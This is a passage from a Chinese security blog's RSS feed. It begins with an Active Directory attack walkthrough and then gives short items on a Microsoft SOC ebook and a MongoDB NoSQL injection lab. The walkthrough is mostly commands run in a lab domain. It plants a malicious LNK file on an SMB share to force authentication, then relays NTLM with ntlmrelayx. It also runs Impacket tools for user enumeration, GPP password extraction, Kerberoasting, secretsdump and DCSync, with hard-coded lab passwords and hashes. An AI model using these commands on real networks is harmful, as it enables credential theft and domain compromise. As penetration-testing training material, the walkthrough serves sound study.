&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mkdir&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;New-SmbShare&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;file6&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\file6&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ChangeAccess&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Users&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-FullAccess&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Administrators&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$objShell&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WScript&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Shell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$objShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;CreateShortcut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\file6\malicious.lnk&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;TargetPath&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\\10.0.0.8\@threat.png&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;WindowStyle&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IconLocation&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;%windir%\system32\shell32.dll, 3&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Description&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;用户浏览含此LNK文件的共享时将触发SMB认证&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;HotKey&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Ctrl+Alt+O&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lnk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;中间人攻击mitre-attck-t1557&#34;&gt;中间人攻击（MITRE ATT&amp;amp;CK T1557）
&lt;/h3&gt;&lt;p&gt;启动ntlmrelayx监听器：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo -s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /opt/impacket
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; imp-env/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; examples
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ntlmrelayx.py -t 192.168.2.5 -smb2support &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tee –a /opt/impacket/relay1.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当受害者访问含恶意LNK的共享时，凭证将被中继到目标系统。&lt;/p&gt;
&lt;h3 id=&#34;ldap服务攻击&#34;&gt;LDAP服务攻击
&lt;/h3&gt;&lt;p&gt;针对域控制器的安全LDAP服务（TCP/636）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ntlmrelayx.py -t ldaps://dc01.doazlab.com -ts -l /opt/impacket/loot --add-computer BHISBlog47 --dump-laps --no-dump --no-da
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;参数说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-t&lt;/code&gt;: 指定目标LDAP服务&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-ts&lt;/code&gt;: 控制台输出添加时间戳&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt;: 定义战利品目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--add-computer&lt;/code&gt;: 添加域计算机&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--dump-laps&lt;/code&gt;: 提取LAPS密码&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--no-dump&lt;/code&gt;: 不转储AD数据&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--no-da&lt;/code&gt;: 不创建域管理员&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他impacket工具&#34;&gt;其他Impacket工具
&lt;/h2&gt;&lt;h3 id=&#34;getaduserspymitre-attck-t1087&#34;&gt;GetADUsers.py（MITRE ATT&amp;amp;CK T1087）
&lt;/h3&gt;&lt;p&gt;枚举域用户：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3.9 GetADUsers.py -all -ts doazlab.com/doadmin:&lt;span class=&#34;s1&#34;&gt;&amp;#39;DOLabAdmin1!&amp;#39;&lt;/span&gt; -dc-ip 192.168.2.4 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;tee -a /opt/adusers.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;get-gpppasswordpymitre-attck-t1552006&#34;&gt;Get-GPPPassword.py（MITRE ATT&amp;amp;CK T1552.006）
&lt;/h3&gt;&lt;p&gt;提取组策略首选项密码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3.9 Get-GPPPassword.py &lt;span class=&#34;s1&#34;&gt;&amp;#39;doazlab.com&amp;#39;&lt;/span&gt;/&lt;span class=&#34;s1&#34;&gt;&amp;#39;doadmin&amp;#39;&lt;/span&gt;:&lt;span class=&#34;s1&#34;&gt;&amp;#39;DOLabAdmin1!&amp;#39;&lt;/span&gt;@&lt;span class=&#34;s1&#34;&gt;&amp;#39;192.168.2.4&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;getuserspnspymitre-attck-t1558003&#34;&gt;GetUserSPNs.py（MITRE ATT&amp;amp;CK T1558.003）
&lt;/h3&gt;&lt;p&gt;收集Kerberos票据哈希：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3.9 GetUserSPNs.py &lt;span class=&#34;s1&#34;&gt;&amp;#39;doazlab.com&amp;#39;&lt;/span&gt;/&lt;span class=&#34;s1&#34;&gt;&amp;#39;doadmin&amp;#39;&lt;/span&gt;:&lt;span class=&#34;s1&#34;&gt;&amp;#39;DOLabAdmin1!&amp;#39;&lt;/span&gt; -dc-ip 192.168.2.4 -outputfile /opt/hashes/kerbs.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;secretsdumppy&#34;&gt;Secretsdump.py
&lt;/h3&gt;&lt;h4 id=&#34;远程凭证转储mitre-attck-t1003003&#34;&gt;远程凭证转储（MITRE ATT&amp;amp;CK T1003.003）：
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3.9 secretsdump.py doazlab/doadmin:&lt;span class=&#34;s1&#34;&gt;&amp;#39;DOLabAdmin1!&amp;#39;&lt;/span&gt;@192.168.2.5 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;tee -a /opt/hashes/secrets-output.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;dcsync攻击mitre-attck-t1003006&#34;&gt;DCSync攻击（MITRE ATT&amp;amp;CK T1003.006）：
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3.9 secretsdump.py -outputfile &lt;span class=&#34;s1&#34;&gt;&amp;#39;doazlab.dit&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;doazlab.com&amp;#39;&lt;/span&gt;/doadmin@&lt;span class=&#34;s1&#34;&gt;&amp;#39;192.168.2.4&amp;#39;&lt;/span&gt; -hashes aad3c435b514a4eeaad3b935b51304fe:3606a042149187931ced1f8cedafe26c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>构建AI驱动的统一SOC：微软新电子书指南</title>
        <link>http://localhost:1313/p/%E6%9E%84%E5%BB%BAai%E9%A9%B1%E5%8A%A8%E7%9A%84%E7%BB%9F%E4%B8%80soc%E5%BE%AE%E8%BD%AF%E6%96%B0%E7%94%B5%E5%AD%90%E4%B9%A6%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 10:23:13 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%9E%84%E5%BB%BAai%E9%A9%B1%E5%8A%A8%E7%9A%84%E7%BB%9F%E4%B8%80soc%E5%BE%AE%E8%BD%AF%E6%96%B0%E7%94%B5%E5%AD%90%E4%B9%A6%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;构建ai驱动的统一soc微软新电子书指南&#34;&gt;构建AI驱动的统一SOC：微软新电子书指南
&lt;/h1&gt;&lt;p&gt;面对全球每天超过6亿次的网络攻击，微软推出《协调防御：构建AI驱动的统一SOC》电子书，指导企业从传统安全模式转向深度防御策略。该指南基于微软实战经验，提出三大核心改进方向：&lt;/p&gt;
&lt;h2 id=&#34;统一安全运营架构&#34;&gt;统一安全运营架构
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;预防阶段&lt;/strong&gt;：通过风险优先级排序、攻击面缩减和主动漏洞识别增强韧性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检测阶段&lt;/strong&gt;：实现实时威胁隔离、勒索软件快速响应和预测性威胁情报&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;响应阶段&lt;/strong&gt;：提供统一事件队列、自动关联警报和基于严重性的威胁分级&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;关键技术领域防护&#34;&gt;关键技术领域防护
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;端点保护&lt;/strong&gt;：反勒索软件策略和恶意软件防御&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;身份安全&lt;/strong&gt;：防范账户接管的新型身份威胁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;云原生应用&lt;/strong&gt;：针对云漏洞的最佳实践&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SIEM/XDR整合&lt;/strong&gt;：降低误报率并应对高级持续性威胁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据保护&lt;/strong&gt;：敏感数据保护和内部风险缓解&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ai驱动转型路径&#34;&gt;AI驱动转型路径
&lt;/h2&gt;&lt;p&gt;电子书详细介绍了如何通过Microsoft Security Copilot等AI助手实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动化常规任务&lt;/li&gt;
&lt;li&gt;关联警报生成完整事件&lt;/li&gt;
&lt;li&gt;增强现有安全专家能力&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该架构通过集中化数据管理和AI增强分析，将平均解决时间（MTTR）降低40%。企业可访问微软安全博客获取完整电子书及集成网络威胁防护资源。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;数据来源：2024微软数字防御报告&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>NoSQL注入实验室 - 探索MongoDB安全漏洞实战</title>
        <link>http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</link>
        <pubDate>Sat, 02 Aug 2025 10:07:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;nosqli-lab&#34;&gt;NoSQLi Lab
&lt;/h1&gt;&lt;p&gt;随着NoSQL的流行，我决定建立一个实验室来研究针对NoSQL数据库的各种攻击技术。这就是最终的成果&amp;hellip;&lt;/p&gt;
&lt;p&gt;由于之前已使用Redis进行过开发工作，本次实验我选择MongoDB作为研究对象。实验室构建了两种漏洞场景：一种是类似SQL注入中&amp;quot;or 1=1&amp;quot;的经典漏洞，另一种是NoSQL特有的脚本注入攻击。未来可能会添加更多场景，但当前这两个已足够开展基础研究。&lt;/p&gt;
&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建
&lt;/h2&gt;&lt;p&gt;安装过程非常简单，关键是要确保Linux发行版包含PHP的最新MongoDB驱动。正确的驱动是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php-mongodb - MongoDB driver for PHP
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;而错误的旧版驱动是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php5-mongo - MongoDB database driver
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;实验代码托管在Github：https://github.com/digininja/nosqlilab。以下是在Debian Stretch系统上的部署步骤（注意Jessie系统使用旧版驱动无法运行）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get dist-upgrade
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install php-mongodb apache2 vim mongodb git php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /var/www/html/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm index.html 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/digininja/nosqlilab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;访问服务器IP后应看到实验室首页：&lt;/p&gt;
&lt;h2 id=&#34;数据库初始化&#34;&gt;数据库初始化
&lt;/h2&gt;&lt;p&gt;首先需要通过&amp;quot;Reset Database&amp;quot;链接初始化测试数据。成功时会显示&amp;quot;Database Reset Successfully&amp;quot;消息：&lt;/p&gt;
&lt;p&gt;若出现PHP代码说明PHP未正确安装或启用；若页面渲染不完整则可能是MongoDB库缺失，可检查Apache错误日志或通过phpinfo()页面验证驱动是否加载正确。&lt;/p&gt;
&lt;h2 id=&#34;漏洞场景&#34;&gt;漏洞场景
&lt;/h2&gt;&lt;p&gt;实验包含两个存在漏洞的页面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;ldquo;Guess The Key&amp;rdquo; - 经典注入漏洞&lt;/li&gt;
&lt;li&gt;&amp;ldquo;User Lookup&amp;rdquo; - NoSQL特有攻击场景&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;具体攻击方法可参考OWASP的《NoSQL注入测试指南》，实验代码中也提供了隐藏的解决方案示例。&lt;/p&gt;
&lt;h2 id=&#34;问题反馈&#34;&gt;问题反馈
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;提示：所有实验内容由Robin Wood创建，除非另有说明。项目采用非商业性质，可通过affiliate链接支持作者。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>亿次空耗：以太坊ABI解析器中的零大小类型DoS漏洞分析</title>
        <link>http://localhost:1313/p/%E4%BA%BF%E6%AC%A1%E7%A9%BA%E8%80%97%E4%BB%A5%E5%A4%AA%E5%9D%8Aabi%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E9%9B%B6%E5%A4%A7%E5%B0%8F%E7%B1%BB%E5%9E%8Bdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 09:56:18 +0800</pubDate>
        
